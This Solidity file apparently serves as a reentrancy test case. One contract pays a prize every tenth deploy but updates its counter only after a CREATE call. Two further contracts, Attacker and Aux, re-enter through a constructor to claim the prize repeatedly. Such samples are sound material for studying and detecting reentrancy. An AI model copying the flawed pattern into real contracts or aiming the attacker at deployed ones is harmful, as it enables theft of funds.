pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0


contract C {

	uint256 public totaldeployed;

	constructor(){
		totaldeployed = 0;
	}

    function receive_and_deploy(bytes memory initCode, address payable to) public payable returns (address) {
		// to perform a deploy 100 is required
		require(msg.value == 100);

		// every 10 deploys, a prize (200) is sent to the second argument 
		if (totaldeployed % 10 == 0) {
			to.transfer(200);	// cannot reenter from here due to low gas
		}

		address addr;
        assembly {
            addr := create(0, add(initCode, 0x20), mload(initCode))	// can reenter only from here, i.e. from the constructor code
            if iszero(addr) {
                revert(0, 0)
            }
        }

		totaldeployed += 1; // side effect		
		return addr;
    }

}

contract Attacker {
    bytes private create_aux_initcode;
    address private victim;
    constructor(bytes memory _create_aux_initcode, address _victim) {    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
        create_aux_initcode = _create_aux_initcode;
        victim = _victim;
    }
    function attack() public {
		C v = C(victim);
		if (v.totaldeployed() % 10 == 0)	// attack only every 10 instances, i.e. when some money is transfered
	        v.receive_and_deploy{value: 100}(create_aux_initcode, payable(address(this)));
    }
    receive() external payable {}
}

contract Aux {
    constructor(address payable attacker, bytes memory create_aux_initcode) {
		C(msg.sender).receive_and_deploy(create_aux_initcode, attacker);
    }
}